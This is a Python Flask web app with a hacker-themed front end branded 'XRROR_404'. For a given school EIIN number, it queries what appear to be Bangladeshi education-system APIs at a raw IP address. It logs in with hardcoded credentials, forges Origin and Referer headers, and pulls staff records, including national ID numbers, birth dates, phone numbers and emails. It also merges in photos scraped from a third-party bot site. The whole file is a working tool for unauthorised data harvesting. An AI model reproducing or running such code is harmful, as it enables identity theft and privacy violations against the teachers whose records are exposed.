import math
import re
import urllib.parse
import random
import time
import json
from flask import Flask, render_template_string, request, jsonify
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

def get_random_user_agent():
    chromes = [148, 149, 150, 151, 152]
    rand_chrome = chromes[math.floor(math.sin(1) * 100) % len(chromes)]
    rand_build = 555
    return f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand_chrome}.0.7827.{rand_build} Mobile Safari/537.36"

def make_strict_request(url, method='GET', json_payload=None, headers=None):
    if headers is None:
        headers = {}
    session = requests.Session()
    try:
        if method.upper() == 'POST':
            response = session.post(url, json=json_payload, headers=headers, timeout=12)
        else:
            response = session.get(url, headers=headers, timeout=12)
        return response.text
    except Exception:
        return None

def clean_teacher_name(name):
    if not name:
        return ""
    name = name.replace('.', '')
    name = re.sub(r'\s+', '', name)
    return name.lower().strip()

def get_field_value(text, key):
    pattern = re.compile(rf'{re.escape(key)}\s*:\s*([^\r\n]*)', re.IGNORECASE)
    match = pattern.search(text)
    if match:
        return match.group(1).strip()
    return None

def get_institute_data(eiin, ua):
    url = f"http://182.252.85.81:8000/api/v1/institute/public/find-by-eiin/{eiin}?nocache={time.time()}"
    headers = {"Content-Type": "application/json", "User-Agent": ua}
    res = make_strict_request(url, 'GET', headers=headers)
    if not res:
        return None
    try:
        data = json.loads(res)
        target_data = data.get('data') or data
        if target_data:
            return {
                'id': target_data.get('id'),
                'instituteName': target_data.get('instituteName') or target_data.get('name') or 'নাম পাওয়া যায়নি',
                'instituteNameBn': target_data.get('instituteNameBn') or target_data.get('nameInBangla') or target_data.get('nameBn') or 'বাংলা নাম পাওয়া যায়নি',
                'email': target_data.get('email') or target_data.get('instituteEmail') or 'ইমেইল পাওয়া যায়নি',
                'mobile': target_data.get('mobile') or target_data.get('mobileNo') or target_data.get('phone') or 'মোবাইল নম্বর পাওয়া যায়নি',
                'instituteTypeNameBn': target_data.get('instituteTypeNameBn') or target_data.get('instituteTypeBn') or target_data.get('typeNameBn') or 'ইনস্টিটিউট টাইপ পাওয়া যায়নি',
                'managementNameBn': target_data.get('managementNameBn') or target_data.get('managementTypeBn') or target_data.get('managementBn') or 'ম্যানেজমেন্ট তথ্য পাওয়া যায়নি',
                'villageOrHoldingNo': target_data.get('villageOrHoldingNo') or target_data.get('village') or target_data.get('holdingNo') or target_data.get('address') or 'গ্রাম/হোল্ডিং নম্বর পাওয়া যায়নি'
            }
    except Exception:
        pass
    return None

def get_esurvey_data(eiin, ua):
    url = f"http://182.252.85.81:8082/api/v1/basic-info-one/info?eiinNo={eiin}&nocache={time.time()}"
    headers = {"Content-Type": "application/json", "User-Agent": ua}
    res = make_strict_request(url, 'GET', headers=headers)
    if not res:
        return None
    try:
        data = json.loads(res)
        target_data = data.get('data') or data
        if target_data:
            gen_info = target_data.get('generalInfo', {})
            po_name = gen_info.get('postOfficeName') or target_data.get('postOfficeName') or 'পোস্ট অফিস পাওয়া যায়নি'
            return {
                'esurveyId': target_data.get('esurveyId'),
                'postOfficeName': po_name.strip()
            }
    except Exception:
        pass
    return None

def get_access_token(ua):
    anti_cache_key = f"{time.time()}_{random.randint(10000, 99999)}"
    url = f"http://182.252.85.81:8028/api/v1/auth/login?force_refresh={anti_cache_key}"
    payload = {'username': '124168', 'password': '532688'}
    headers = {
        "Host": "182.252.85.81:8028", "Connection": "close", "Content-Type": "application/json",
        "User-Agent": ua, "Accept": "*/*", "Origin": "http://182.252.85.84:3028",
        "X-Requested-With": "mark.via.gp", "Referer": "http://182.252.85.84:3028/", "Accept-Language": "en-US,en;q=0.9"
    }
    res = make_strict_request(url, 'POST', json_payload=payload, headers=headers)
    if not res:
        return None
    try:
        data = json.loads(res)
        token = data.get('accessToken') or data.get('token')
        if not token and isinstance(data.get('data'), dict):
            token = data['data'].get('token') or data['data'].get('accessToken')
        return token
    except Exception:
        pass
    return None

def fetch_images_from_second_api(eiin_no):
    eiin = urllib.parse.quote(str(eiin_no).strip())
    api_url = f"https://w8team.top/Bots/EIIN%20To%20Info%20bot/EIIN%20To%20Info.php?EIINToInfo={eiin}"
    
    headers = {
        'Host': 'w8team.top',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7871.46 Mobile Safari/537.36',
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'dnt': '1',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'wssplashchk=070ee2c8d3950220845bad3080a84b1a5d69ef60.1784578780.1',
        'priority': 'u=0, i'
    }

    image_map = {}
    try:
        response = requests.get(api_url, headers=headers, timeout=20, verify=False)
        raw_text = response.text
        try:
            outer_json = response.json()
            if isinstance(outer_json, dict) and 'data' in outer_json:
                raw_text = outer_json['data']
        except Exception:
            pass

        teacher_blocks = re.split(r'\[Teacher\s+#\d+\]', raw_text, flags=re.IGNORECASE)
        if len(teacher_blocks) > 1:
            teacher_blocks.pop(0)

        for block in teacher_blocks:
            teacher_name = get_field_value(block, 'FullName') or get_field_value(block, 'TeacherName') or get_field_value(block, 'Name')
            image = get_field_value(block, 'Image')
            
            if teacher_name and image and image != '-' and image != 'NULL':
                clean_name = clean_teacher_name(teacher_name)
                image_map[clean_name] = image.strip()
    except Exception:
        pass

    return image_map

@app.route('/')
def portal():
    action = request.args.get('action')
    if action == 'fetch_data':
        eiin_no = request.args.get('eiinNo')
        page = request.args.get('page', 1)
        size = request.args.get('size', 200)

        if not eiin_no:
            return jsonify({'status': 'error', 'msg': 'দয়া করে eiinNo দিন!'})

        current_ua = get_random_user_agent()
        inst_data = get_institute_data(eiin_no, current_ua)
        esurvey_data = get_esurvey_data(eiin_no, current_ua)

        inst_id = inst_data.get('id') if inst_data else None
        esurvey_id = esurvey_data.get('esurveyId') if esurvey_data else None
        final_inst_id = inst_id or esurvey_id

        if not final_inst_id or not esurvey_id:
            return jsonify({'status': 'error', 'msg': 'প্রয়োজনীয় ID বা EIIN পাওয়া যায়নি।'})

        token = get_access_token(current_ua)
        if not token:
            return jsonify({'status': 'error', 'msg': 'Bearer Token জেনারেট করা সম্ভব হয়নি।'})

        api_url = f"http://182.252.85.81:8028/api/v1/employee/list?page={page}&size={size}&eSurveyId={esurvey_id}&instituteId={final_inst_id}&request_id={random.randint(1111, 9999)}"
        employee_headers = {
            "Host": "182.252.85.81:8028", "Authorization": f"Bearer {token}", "Connection": "close",
            "Content-Type": "application/json", "User-Agent": current_ua, "Accept": "*/*",
            "Origin": "http://182.252.85.84:3028", "Referer": "http://182.252.85.84:3028/"
        }

        final_res = make_strict_request(api_url, 'GET', headers=employee_headers)
        output_data = []
        if final_res:
            try:
                final_data = json.loads(final_res)
                output_data = final_data.get('data') or final_data or []
            except Exception:
                pass

        api_images = fetch_images_from_second_api(eiin_no)

        if isinstance(output_data, list):
            for emp in output_data:
                name = emp.get('generalInformation', {}).get('employeeName', '')
                clean_emp_name = clean_teacher_name(name)
                
                if clean_emp_name and clean_emp_name in api_images:
                    emp['generalInformation']['image'] = api_images[clean_emp_name]
                else:
                    emp['generalInformation']['image'] = None

        return jsonify({
            'status': 'success',
            'info': inst_data,
            'instName': inst_data['instituteName'] if inst_data else 'N/A',
            'data': {'data': output_data}
        })

    html_content = """<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ROOT@Xrror-404_TERMINAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        body { background: #000; color: #00ff41; font-family: 'Fira Code', monospace; margin: 0; overflow-x: hidden; }
        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.4; }
        
        #hacker-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.98); z-index: 10000; display: none;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .loader-box { width: 300px; text-align: left; }
        .progress-bar-bg { width: 100%; height: 4px; background: rgba(0,255,65,0.1); margin: 15px 0; border-radius: 10px; overflow: hidden; }
        #progress-fill { width: 0%; height: 100%; background: #00ff41; box-shadow: 0 0 10px #00ff41; }
        #log-stream { height: 120px; overflow: hidden; font-size: 10px; color: #008f11; margin-top: 10px; line-height: 1.4; }

        .ios-glass {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 65, 0.15); border-radius: 15px;
        }
        .hacker-blink { animation: blink 2.5s infinite ease-in-out; }
        @keyframes blink {
            0%, 100% { opacity: 1; filter: drop-shadow(0 0 2px #00ff41); }
            50% { opacity: 0.5; filter: drop-shadow(0 0 8px #00ff41); }
        }
        .glitch-text { text-shadow: 0 0 10px #00ff41; animation: glitch-glow 1s infinite alternate; }
        @keyframes glitch-glow {
            0% { text-shadow: 0 0 5px #00ff41, 2px 0 #f00; }
            100% { text-shadow: 0 0 15px #00ff41, -2px 0 #00f; }
        }
        .status-pulse {
            width: 10px; height: 10px; background: #00ff41; border-radius: 50%;
            box-shadow: 0 0 15px #00ff41; animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.5; } }

        .label { font-size: 10px; color: rgba(0, 255, 65, 0.5); text-transform: uppercase; margin-top: 8px; font-weight: bold; }
        .data-field { font-size: 14px; color: #fff; min-height: 20px; }
        .btn-scan { background: #00ff41; color: #000; font-weight: bold; border-radius: 4px; transition: 0.3s; }
        .btn-scan:hover { box-shadow: 0 0 25px #00ff41; transform: scale(1.05); }
        .footer-link { color: #00ff41; text-decoration: none; border: 1px solid #00ff41; padding: 5px 15px; border-radius: 4px; font-size: 11px; transition: 0.3s; }
        .footer-link:hover { background: #00ff41; color: #000; }
        
        .btn-action { border: 1px solid rgba(0,255,65,0.4); color: #00ff41; background: transparent; transition: 0.2s; }
        .btn-action:hover { background: rgba(0,255,65,0.1); box-shadow: 0 0 10px rgba(0,255,65,0.2); }

        @media print {
            body { background: white !important; color: black !important; }
            #matrix-canvas, header, footer, .btn-action, #searchTerm, .hacker-loader { display: none !important; }
            .ios-glass { border: 1px solid #ccc !important; background: transparent !important; color: black !important; backdrop-filter: none !important; box-shadow: none !important; }
            .data-field { color: black !important; }
            .label { color: #555 !important; }
            #cards-container { grid-template-columns: 1fr !important; gap: 15px !important; }
        }
    </style>
</head>
<body>

    <div id="hacker-loader">
        <div class="loader-box">
            <div class="flex items-center justify-between mb-2">
                <div class="text-xs tracking-[5px] animate-pulse">SYSTEM_DECRYPTING</div>
                <div id="load-pct" class="text-xs">0%</div>
            </div>
            <div class="progress-bar-bg"><div id="progress-fill"></div></div>
            <div id="log-stream"></div>
            <div class="mt-4 text-[8px] opacity-40 font-mono tracking-tighter" id="binary-glitch">010101010101010101010101</div>
        </div>
    </div>

    <canvas id="matrix-canvas"></canvas>

    <header class="ios-glass m-4 p-4 sticky top-4 z-50">
        <div class="container mx-auto flex flex-col sm:flex-row justify-between items-center gap-4">
            <div class="flex items-center gap-3">
                <div class="status-pulse"></div>
                <h1 class="text-xs font-bold uppercase tracking-[4px] text-white">XRROR_404 V6</h1>
            </div>
            <div class="flex w-full sm:w-auto gap-2">
                <input type="number" id="eiinInput" placeholder="Enter EIIN Number" 
                       class="bg-black/40 text-green-400 border border-green-900/50 rounded px-4 py-2 outline-none w-full text-sm">
                <button onclick="fetchData()" class="btn-scan px-6 py-2 uppercase">Scan</button>
            </div>
        </div>
    </header>

    <main class="container mx-auto px-4 py-6" id="content-area">
        <div class="h-80 flex flex-col items-center justify-center opacity-10">
            <p class="tracking-[10px] text-xs">PORT_READY_FOR_INJECTION</p>
        </div>
    </main>

    <footer class="container mx-auto px-4 py-12 text-center border-t border-green-900/20">
        <div class="flex flex-col items-center gap-5">
            <span class="text-sm font-bold text-white tracking-widest opacity-70">ADMIN: DIPTO</span>
            <a href="https://t.me/Xrror_404" target="_blank" class="footer-link uppercase font-bold tracking-widest">Join Telegram</a>
        </div>
    </footer>

    <script>
        let cachedEmployees = [];
        let loaderInterval = null; 

        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const chars = "010101DIPTO";
        const fontSize = 15;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.08)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);

        function startLoader() {
            const logs = [
                "REQUESTING_STRICT_TOKEN...", 
                "ACCESS_GRANTED!", 
                "INJECTING_PAYLOAD...", 
                "FETCHING_INST_DATA...", 
                "MATCHING_NAMES_AND_IMAGES...", 
                "DECRYPTING_SECURE_NODE..."
            ];
            const logBox = document.getElementById('log-stream');
            const fill = document.getElementById('progress-fill');
            const pct = document.getElementById('load-pct');
            const binary = document.getElementById('binary-glitch');
            
            let p = 0;
            logBox.innerHTML = '';
            
            if(loaderInterval) clearInterval(loaderInterval);

            loaderInterval = setInterval(() => {
                if (p < 92) {
                    p += Math.floor(Math.random() * 3) + 1;
                    if(p > 92) p = 92;
                    fill.style.width = p + '%';
                    pct.innerText = p + '%';
                }
                
                const line = document.createElement('div');
                line.innerText = '> ' + logs[Math.floor(Math.random() * logs.length)];
                logBox.prepend(line);

                if(logBox.children.length > 8) {
                    logBox.removeChild(logBox.lastChild);
                }

                binary.innerText = Math.random().toString(2).substr(2, 40);
            }, 80); 
        }

        function endLoader() {
            clearInterval(loaderInterval);
            const fill = document.getElementById('progress-fill');
            const pct = document.getElementById('load-pct');
            
            fill.style.width = '100%';
            pct.innerText = '100%';
            
            setTimeout(() => { 
                document.getElementById('hacker-loader').style.display = 'none'; 
            }, 500);
        }

        function animateData(element, finalValue, duration = 25) {
            if(!element) return;
            const scrambleChars = "!@#$%^&*()_+0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            let iteration = 0;
            const interval = setInterval(() => {
                element.innerText = finalValue.split("")
                    .map((char, index) => {
                        if (index < iteration) return finalValue[index];
                        return scrambleChars[Math.floor(Math.random() * scrambleChars.length)];
                    }).join("");
                
                if (iteration >= finalValue.length) {
                    clearInterval(interval);
                    element.classList.add('hacker-blink');
                }
                iteration += 1 / 3;
            }, duration);
        }

        async function fetchData() {
            const eiin = document.getElementById('eiinInput').value;
            if(!eiin) return;

            const loader = document.getElementById('hacker-loader');
            const contentArea = document.getElementById('content-area');

            loader.style.display = 'flex';
            startLoader();
            
            try {
                const response = await fetch(`/?action=fetch_data&eiinNo=${eiin}`);
                const res = await response.json();

                if (res.status === 'success') {
                    cachedEmployees = res.data.data || [];
                    const totalEmployees = cachedEmployees.length.toString().padStart(2, '0');
                    const info = res.info || {};
                    const uniqueDesignations = new Set(cachedEmployees.map(e => e.recruitmentInformation?.designationName).filter(Boolean)).size;

                    contentArea.innerHTML = `
                        <div id="printable-area">
                            <div class="ios-glass p-6 mb-6 border-l-4 border-l-green-500 grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div>
                                    <h2 id="inst-title" class="text-xl font-bold text-white uppercase tracking-wider"></h2>
                                    <p class="text-xs text-gray-400 mt-1">${info.instituteNameBn || ''}</p>
                                    <div class="mt-4 text-sm text-green-400 font-bold tracking-widest">
                                        TOTAL_EMPLOYEES: [<span id="total-count" class="glitch-text text-white">--</span>]
                                    </div>
                                </div>
                                <div class="text-xs space-y-1 text-gray-300 border-t md:border-t-0 md:border-l border-green-900/30 pt-3 md:pt-0 md:pl-4 font-mono">
                                    <div><span class="text-green-500">TYPE:</span> ${info.instituteTypeNameBn || 'N/A'}</div>
                                    <div><span class="text-green-500">MGMT:</span> ${info.managementNameBn || 'N/A'}</div>
                                    <div><span class="text-green-500">MOB:</span> ${info.mobile || 'N/A'}</div>
                                    <div><span class="text-green-500">MAIL:</span> ${info.email || 'N/A'}</div>
                                    <div><span class="text-green-500">ADDR:</span> ${info.villageOrHoldingNo || 'N/A'}</div>
                                </div>
                            </div>

                            <div id="action-bar" class="ios-glass p-4 mb-6 flex flex-col md:flex-row justify-between items-center gap-4 font-mono text-xs">
                                <div class="w-full md:w-72 flex items-center bg-black/50 border border-green-900/40 rounded px-3 py-1.5">
                                    <span class="text-green-600 mr-2">🔎</span>
                                    <input type="text" id="searchTerm" oninput="filterCards()" placeholder="Search Name, Post..." 
                                           class="bg-transparent text-green-400 placeholder-green-800 outline-none w-full text-xs">
                                </div>
                                <div class="flex flex-wrap items-center gap-2">
                                    <div class="text-gray-400 mr-2">UNIQUE_POSTS: <span class="text-orange-400 font-bold">${uniqueDesignations}</span></div>
                                    <button onclick="exportToImage()" class="btn-action px-3 py-1.5 rounded uppercase font-bold text-[10px] tracking-wider">
                                        🖼️ Save Image
                                    </button>
                                    <button onclick="window.print()" class="btn-action px-3 py-1.5 rounded uppercase font-bold text-[10px] tracking-wider">
                                        📄 Print / PDF
                                    </button>
                                </div>
                            </div>

                            <div id="cards-container" class="grid grid-cols-1 md:grid-cols-2 gap-6"></div>
                        </div>`;

                    animateData(document.getElementById('inst-title'), res.instName);
                    setTimeout(() => animateData(document.getElementById('total-count'), totalEmployees, 60), 400);

                    renderCards(cachedEmployees);

                } else { alert("Error: " + res.msg); }
            } catch (e) { alert("Connection Error"); }
            finally { 
                endLoader(); 
            }
        }

        function renderCards(list) {
            const container = document.getElementById('cards-container');
            container.innerHTML = '';
            
            if(list.length === 0) {
                container.innerHTML = `<div class="col-span-full text-center text-sm opacity-50 py-12">NO MATCHING DATA FOUND</div>`;
                return;
            }

            list.forEach((emp, i) => {
                const genInfo = emp.generalInformation || {};
                const recInfo = emp.recruitmentInformation || {};
                
                let imageTag = '';
                if(genInfo.image && genInfo.image !== null && genInfo.image !== '' && genInfo.image !== 'NULL') {
                    imageTag = `<div class="mb-3 flex justify-start">
                                    <img src="${genInfo.image}" alt="Profile" class="w-20 h-24 object-cover rounded-md border border-green-500/30 shadow-md">
                                </div>`;
                }

                const cardHtml = `
                    <div class="ios-glass p-6 transition-all duration-300 hover:border-green-400/40">
                        ${imageTag}
                        <div class="border-b border-white/10 pb-3 mb-4">
                            <h3 class="text-white font-bold text-md">${genInfo.employeeName || 'N/A'}</h3>
                            <div class="text-[10px] text-green-400 font-bold uppercase">${recInfo.designationName || 'N/A'}</div>
                            <div class="text-orange-400 text-[10px] font-bold mt-1">Subject: ${recInfo.subjectName || "N/A"}</div>
                        </div>
                        <div class="label">NID</div><div class="data-field font-mono text-xs">${genInfo.nid || "N/A"}</div>
                        <div class="label">Date of Birth</div><div class="data-field text-sm">${genInfo.dateOfBirth || "N/A"}</div>
                        <div class="label">Mobile</div><div class="data-field text-green-400 font-bold text-sm">${genInfo.mobileNumber || 'N/A'}</div>
                        <div class="label">Email</div><div class="data-field text-gray-400 italic text-xs truncate">${genInfo.email || "N/A"}</div>
                    </div>`;
                container.insertAdjacentHTML('beforeend', cardHtml);
            });
        }

        function filterCards() {
            const term = document.getElementById('searchTerm').value.toLowerCase().trim();
            if(!term) {
                renderCards(cachedEmployees);
                return;
            }
            
            const filtered = cachedEmployees.filter(emp => {
                const name = (emp.generalInformation?.employeeName || '').toLowerCase();
                const mobile = (emp.generalInformation?.mobileNumber || '').toLowerCase();
                const desig = (emp.recruitmentInformation?.designationName || '').toLowerCase();
                const subject = (emp.recruitmentInformation?.subjectName || '').toLowerCase();
                
                return name.includes(term) || mobile.includes(term) || desig.includes(term) || subject.includes(term);
            });
            
            renderCards(filtered);
        }

        function exportToImage() {
            const element = document.getElementById('printable-area');
            const actionBar = document.getElementById('action-bar');
            
            actionBar.style.display = 'none';

            html2canvas(element, {
                backgroundColor: '#000000',
                scale: 2, 
                logging: false,
                useCORS: true
            }).then(canvas => {
                actionBar.style.display = 'flex'; 
                
                const image = canvas.toDataURL("image/png");
                const link = document.createElement('a');
                const eiinVal = document.getElementById('eiinInput').value || 'Data';
                
                link.download = `Personnel_Portal_${eiinVal}.png`;
                link.href = image;
                link.click();
            }).catch(err => {
                actionBar.style.display = 'flex';
                alert("Image conversion failed.");
            });
        }
    </script>
</body>
</html>"""
    return render_template_string(html_content)

# Vercel needs WSGI entry point handler
app = app

